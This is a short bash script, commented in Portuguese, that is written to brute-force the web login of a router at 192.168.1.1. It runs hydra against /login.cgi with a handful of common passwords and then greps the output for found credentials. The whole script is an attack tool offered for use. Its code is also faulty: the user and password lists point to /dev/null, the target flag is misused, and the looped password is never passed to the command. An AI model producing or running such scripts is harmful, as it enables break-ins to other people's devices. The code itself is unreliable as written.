#!/bin/bash

# Lista de usuários e senhas a serem testados
USERS=(admin)
PASSWORDS=(password123 123456 admin 12345678)

# Endereço IP do roteador a ser atacado
ROUTER_IP="192.168.1.1"

# Protocolo utilizado (ex: http, https)
PROTOCOL="http"

# Porta utilizada pelo protocolo
PORT=80

# Caminho do login do roteador
LOGIN_PATH="/login.cgi"

# Comando para executar o ataque
COMMAND="hydra -L /dev/null -P /dev/null -M $ROUTER_IP $PROTOCOL-post-form \"$LOGIN_PATH:login=admin&password=^PASS^:login_error\" -t 5 -w 5 -o result.txt"

# Realiza o ataque com todas as senhas da lista
for PASSWORD in "${PASSWORDS[@]}"
do
  echo "Testing password: $PASSWORD"
  eval $COMMAND
done

# Exibe as senhas encontradas
echo "Passwords found:"
grep "login:admin password:" result.txt | cut -d " " -f 3
